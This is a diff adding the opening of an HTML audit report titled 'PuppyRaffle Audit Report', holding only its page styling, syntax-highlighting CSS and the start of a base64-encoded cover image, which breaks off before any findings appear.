@@ -1,0 +1,1155 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PuppyRaffle Audit Report - Mohammad Ayaan</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Sans+3:ital,wght@0,400;0,600;0,700;0,800;1,400&family=Source+Code+Pro:wght@400;600&display=swap">
+<style>
+@page {
+  size: A4;
+  margin: 2.6cm 2.3cm 2.4cm 2.3cm;
+  @top-left    { content: "PuppyRaffle Audit Report"; font: 9pt/1 var(--font); color: #555; }
+  @top-right   { content: "November 13, 2026";  font: 9pt/1 var(--font); color: #555; }
+  @bottom-left { content: "Mohammad Ayaan";   font: 9pt/1 var(--font); color: #555; }
+  @bottom-right{ content: counter(page); font: 9pt/1 var(--font); color: #555; }
+}
+@page cover {
+  @top-left { content: none; } @top-right { content: none; }
+  @bottom-left { content: none; } @bottom-right { content: none; }
+}
+
+@page :first {
+  @top-left { content: none; } @top-right { content: none; }
+  @bottom-left { content: none; } @bottom-right { content: none; }
+}
+
+:root {
+  --font: "Source Sans 3", "Source Sans Pro", "Noto Sans", "Segoe UI", Inter,
+          "Helvetica Neue", Arial, sans-serif;
+  --mono: "Source Code Pro", "JetBrains Mono", Consolas, "DejaVu Sans Mono", monospace;
+  --ink: #111;
+  --muted: #555;
+  --rule: #cfd3d8;
+  --code-bg: #f5f6f8;
+}
+* { box-sizing: border-box; }
+html { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+body {
+  font-family: var(--font);
+  font-size: 11pt;
+  line-height: 1.5;
+  color: var(--ink);
+  max-width: 17cm;
+  margin: 0 auto;
+  padding: 1.5cm 1cm;
+}
+@media print { body { max-width: none; padding: 0; } }
+
+/* ---------- cover ---------- */
+.cover {
+  page: cover;
+  display: flex; flex-direction: column; align-items: center;
+  text-align: center;
+  height: 23.6cm;
+}
+.cover-logo { width: 9cm; height: auto; margin-top: 1.6cm; border-radius: 6px; }
+.cover-title { border: 0; padding: 0; font-size: 30pt; font-weight: 800; line-height: 1.15; margin: 3.2cm 0 0; }
+.cover-version { font-size: 14pt; margin: 1.1cm 0 0; }
+.cover-org { font-size: 14pt; margin: 2.2cm 0 0; line-height: 1.6; }
+.cover-org em { font-style: italic; }
+.cover-date { font-size: 12pt; margin: auto 0 0; }
+.page-break { height: 0; margin: 0; }
+@media print { .page-break { display: none; } }
+@media screen { .cover { height: auto; min-height: 90vh; } .page-break { border-top: 1px dashed var(--rule); margin: 2cm 0; } }
+
+/* ---------- title block (page 2) ---------- */
+.title-block { text-align: center; margin: 0 0 1.4cm; }
+.title-block h1 { font-size: 24pt; font-weight: 800; margin: 0 0 .5em; border: 0; padding: 0; }
+.title-block .tb-org { font-size: 13pt; margin: 0; }
+.title-block .tb-date { font-size: 11pt; color: var(--muted); margin: .3em 0 0; }
+
+/* ---------- headings ---------- */
+h1, h2, h3, h4 { font-weight: 700; line-height: 1.25; break-after: avoid; }
+h1 { font-size: 22pt; margin: 1.5em 0 .5em; padding-bottom: .2em; border-bottom: 1px solid var(--rule); }
+h2 { font-size: 16pt; margin: 1.4em 0 .5em; }
+h3 { font-size: 13.5pt; margin: 1.6em 0 .6em; }
+p { margin: .6em 0 .9em; orphans: 3; widows: 3; }
+a { color: #1b4f9c; text-decoration: none; }
+a:hover { text-decoration: underline; }
+hr { border: 0; border-top: 1px solid var(--rule); margin: 1.6em 0; }
+strong { font-weight: 700; }
+
+h1 code, h2 code, h3 code { background: none; font-weight: 700; font-size: .95em; padding: 0; }
+
+/* ---------- lists ---------- */
+ul, ol { padding-left: 1.4em; margin: .5em 0 1em; }
+li { margin: .15em 0; }
+#table-of-contents + ul { list-style: none; padding-left: .2em; }
+#table-of-contents + ul ul { list-style: none; padding-left: 1.5em; }
+
+/* ---------- tables ---------- */
+table { border-collapse: collapse; margin: 1em auto 1.2em; font-size: 10.5pt; break-inside: avoid; }
+th, td { border: 1px solid var(--rule); padding: .4em .9em; }
+th { background: #f0f2f5; font-weight: 700; }
+td:not(:first-child), th:not(:first-child) { text-align: center; }
+
+/* ---------- code ---------- */
+code { font-family: var(--mono); font-size: .88em; background: var(--code-bg);
+       padding: .08em .3em; border-radius: 3px; }
+pre { background: var(--code-bg); border: 1px solid #e3e6ea; border-radius: 5px;
+      padding: .7em .9em; margin: .8em 0 1.1em; font-size: 8.8pt; line-height: 1.45;
+      white-space: pre-wrap; word-break: break-word; overflow: visible; }
+pre code, .codehilite pre code { background: none; padding: 0; font-size: inherit; }
+.codehilite { margin: 0; break-inside: avoid; }
+.codehilite pre { margin: .8em 0 1.1em; }
+.codehilite .gd { color: #b42318; background: #fde8e8; }   /* diff: removed */
+.codehilite .gi { color: #1a7f37; background: #e6f6ea; }   /* diff: added   */
+
+/* ---------- details (PoC code) ---------- */
+details { margin: 1em 0; }
+summary { font-weight: 700; cursor: pointer; break-after: avoid; }
+details .codehilite { break-inside: auto; }
+details[open] > summary { margin-bottom: .4em; }
+
+/* ---------- misc ---------- */
+.footer-note { color: var(--muted); font-size: 9.5pt; text-align: center; margin-top: 2cm; }
+
+/* pygments (light) */
+pre { line-height: 125%; }
+td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.codehilite .hll { background-color: #ffffcc }
+.codehilite { background: #f8f8f8; }
+.codehilite .c { color: #3D7B7B; font-style: italic } /* Comment */
+.codehilite .err { border: 1px solid #F00 } /* Error */
+.codehilite .k { color: #008000; font-weight: bold } /* Keyword */
+.codehilite .o { color: #666 } /* Operator */
+.codehilite .ch { color: #3D7B7B; font-style: italic } /* Comment.Hashbang */
+.codehilite .cm { color: #3D7B7B; font-style: italic } /* Comment.Multiline */
+.codehilite .cp { color: #9C6500 } /* Comment.Preproc */
+.codehilite .cpf { color: #3D7B7B; font-style: italic } /* Comment.PreprocFile */
+.codehilite .c1 { color: #3D7B7B; font-style: italic } /* Comment.Single */
+.codehilite .cs { color: #3D7B7B; font-style: italic } /* Comment.Special */
+.codehilite .gd { color: #A00000 } /* Generic.Deleted */
+.codehilite .ge { font-style: italic } /* Generic.Emph */
+.codehilite .ges { font-weight: bold; font-style: italic } /* Generic.EmphStrong */
+.codehilite .gr { color: #E40000 } /* Generic.Error */
+.codehilite .gh { color: #000080; font-weight: bold } /* Generic.Heading */
+.codehilite .gi { color: #008400 } /* Generic.Inserted */
+.codehilite .go { color: #717171 } /* Generic.Output */
+.codehilite .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
+.codehilite .gs { font-weight: bold } /* Generic.Strong */
+.codehilite .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
+.codehilite .gt { color: #04D } /* Generic.Traceback */
+.codehilite .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
+.codehilite .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
+.codehilite .kn { color: #008000; font-weight: bold } /* Keyword.Namespace */
+.codehilite .kp { color: #008000 } /* Keyword.Pseudo */
+.codehilite .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
+.codehilite .kt { color: #B00040 } /* Keyword.Type */
+.codehilite .m { color: #666 } /* Literal.Number */
+.codehilite .s { color: #BA2121 } /* Literal.String */
+.codehilite .na { color: #687822 } /* Name.Attribute */
+.codehilite .nb { color: #008000 } /* Name.Builtin */
+.codehilite .nc { color: #00F; font-weight: bold } /* Name.Class */
+.codehilite .no { color: #800 } /* Name.Constant */
+.codehilite .nd { color: #A2F } /* Name.Decorator */
+.codehilite .ni { color: #717171; font-weight: bold } /* Name.Entity */
+.codehilite .ne { color: #CB3F38; font-weight: bold } /* Name.Exception */
+.codehilite .nf { color: #00F } /* Name.Function */
+.codehilite .nl { color: #767600 } /* Name.Label */
+.codehilite .nn { color: #00F; font-weight: bold } /* Name.Namespace */
+.codehilite .nt { color: #008000; font-weight: bold } /* Name.Tag */
+.codehilite .nv { color: #19177C } /* Name.Variable */
+.codehilite .ow { color: #A2F; font-weight: bold } /* Operator.Word */
+.codehilite .w { color: #BBB } /* Text.Whitespace */
+.codehilite .mb { color: #666 } /* Literal.Number.Bin */
+.codehilite .mf { color: #666 } /* Literal.Number.Float */
+.codehilite .mh { color: #666 } /* Literal.Number.Hex */
+.codehilite .mi { color: #666 } /* Literal.Number.Integer */
+.codehilite .mo { color: #666 } /* Literal.Number.Oct */
+.codehilite .sa { color: #BA2121 } /* Literal.String.Affix */
+.codehilite .sb { color: #BA2121 } /* Literal.String.Backtick */
+.codehilite .sc { color: #BA2121 } /* Literal.String.Char */
+.codehilite .dl { color: #BA2121 } /* Literal.String.Delimiter */
+.codehilite .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
+.codehilite .s2 { color: #BA2121 } /* Literal.String.Double */
+.codehilite .se { color: #AA5D1F; font-weight: bold } /* Literal.String.Escape */
+.codehilite .sh { color: #BA2121 } /* Literal.String.Heredoc */
+.codehilite .si { color: #A45A77; font-weight: bold } /* Literal.String.Interpol */
+.codehilite .sx { color: #008000 } /* Literal.String.Other */
+.codehilite .sr { color: #A45A77 } /* Literal.String.Regex */
+.codehilite .s1 { color: #BA2121 } /* Literal.String.Single */
+.codehilite .ss { color: #19177C } /* Literal.String.Symbol */
+.codehilite .bp { color: #008000 } /* Name.Builtin.Pseudo */
+.codehilite .fm { color: #00F } /* Name.Function.Magic */
+.codehilite .vc { color: #19177C } /* Name.Variable.Class */
+.codehilite .vg { color: #19177C } /* Name.Variable.Global */
+.codehilite .vi { color: #19177C } /* Name.Variable.Instance */
+.codehilite .vm { color: #19177C } /* Name.Variable.Magic */
+.codehilite .il { color: #666 } /* Literal.Number.Integer.Long */
+</style>
+</head>
+<body>
+<div class="cover">
+<p><img src="data:image/jpeg;base64,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